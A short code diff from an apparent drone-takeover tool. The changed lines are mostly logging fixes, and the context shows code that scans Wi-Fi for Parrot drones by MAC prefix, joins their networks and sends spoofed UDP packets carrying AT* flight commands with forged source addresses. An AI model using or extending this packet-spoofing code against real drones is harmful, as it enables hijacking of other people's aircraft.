@@ -68,8 +68,8 @@ def scanForParrots(interface, whitelist, underattack):
 	for ap in aps:
 		if ap.address.startswith('90:03:B7') or ap.address.startswith('00:26:7E') or ap.address.startswith('A0:14:3D') or ap.address.startswith('00:12:1C') or ap.address.startswith('58:44:98:13:80'): #if it is a parrot OR my phone (for testing)
 			if ap.address not in whitelist and ap.address not in underattack: #only add if new and not on the whitelist
-				logging.info("New parrot wifi found:", ap.ssid)
-				arduinoLCD("New drone: " + ap.ssid)
+				logging.info("New parrot wifi found: %s", ap.ssid)
+				arduinoLCD("New:" + ap.ssid)
 				parrots.append(ap)
 	return parrots
 
@@ -80,7 +80,7 @@ def connectTo(ap, interface):
 		scheme.save()
 		scheme.activate() #connect to the Parrot's wifi
 	except Exception as detail:
-		logging.error("Error while trying to connect to wifi in function connectTo - ", detail)
+		logging.error("Error while trying to connect to wifi in function connectTo - %s", detail)
 		return False
 	#reset global variables for sniffing
 	global srcMAC, dstMAC, srcIP, dstIP, seqNr
@@ -163,7 +163,7 @@ def sendSpoofedParrotPacket(command, interface, srcMAC, dstMAC, srcIP, dstIP, se
 
 	for i in range(1, count+1):
 		payload = "AT*" + part1 + "=" + str(seqNr+i+1000000) + "," + part2 + "\r"
-		logging.debug(payload)
+		logging.debug("Sending the following payload: %s",payload)
 		spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
 		sendp(spoofed_packet, iface=interface)
 		sleep(0.3)
